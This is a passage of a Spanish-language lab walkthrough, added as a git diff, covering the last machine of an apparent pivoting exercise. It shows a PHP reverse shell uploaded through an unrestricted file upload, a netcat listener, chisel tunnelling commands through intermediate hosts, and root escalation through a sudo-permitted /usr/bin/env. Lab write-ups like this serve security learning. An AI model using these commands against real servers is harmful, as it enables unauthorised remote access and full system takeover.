@@ -402,3 +402,57 @@ Nos encontramos la siguiente web:
 
 Todo apunta a que la vulnerabilidad de la web es un File Upload. Vemos que la web es php, por lo que intentaremos subir un archivo de este tipo que se pueda ejecutar en el servidor. 
 
+Antes de nada, en una web tiramos siempre fuzzing:
+
+<img width="750" height="269" alt="imagen" src="https://github.com/user-attachments/assets/72c3f883-1088-487f-90c8-d86dc9267837" />
+
+Encontramos una ruta de los archivos que subimos: /uploads. 
+
+Subiremos una reverse shell php:
+```bash
+cd /usr/share/webshells/php
+sudo nano php-reverse-shell
+
+# cambiar
+$ip = "30.30.30.2";
+$port = 1234;
+```
+
+Haremos lo siguiente:
+```bash
+# en kali
+nc -lvnp 1234
+
+# Trust
+./chisel client 10.10.10.1:8000 1234:127.0.0.1:1234
+
+# Inclusion
+./chisel client 20.20.20.2:9000 R:20.20.20.2:1081:socks 1234:127.0.0.1:1234
+```
+ Ahora vamos a la ruta /uploads y clicamos sobre la reverse shell para que se ejecute:
+ <img width="1309" height="378" alt="imagen" src="https://github.com/user-attachments/assets/499ec3e2-e9f7-4f79-ab32-20808fb5958b" />
+
+Si volvemos al listener de kali, veremos que tenemos una sesión. Hemos conseguido acceder al servidor.
+<img width="1412" height="284" alt="imagen" src="https://github.com/user-attachments/assets/545df2a8-8029-462b-96d9-e0aafc616398" />
+
+### Upload
+Hemos conseguido acceso a la última máquina. Solo nos queda escalar privilegios:
+
+```bash
+sudo -l
+cat /etc/crontab
+find / -perm -4000 -type f 2>/dev/null
+# ejecutar linpeas.sh
+```
+
+Con `sudo -l` encontramos algo interesante:
+```bash
+(root) NOPASSWD: /usr/bin/env
+```
+
+Podemos escalar privs con eso. Buscamos env en GTFOBins y encontramos: env /bin/sh . Usando la ruta y sudo:
+```bash
+sudo /usr/bin/env bin/sh -p
+```
+
+Máquina completada: ✅
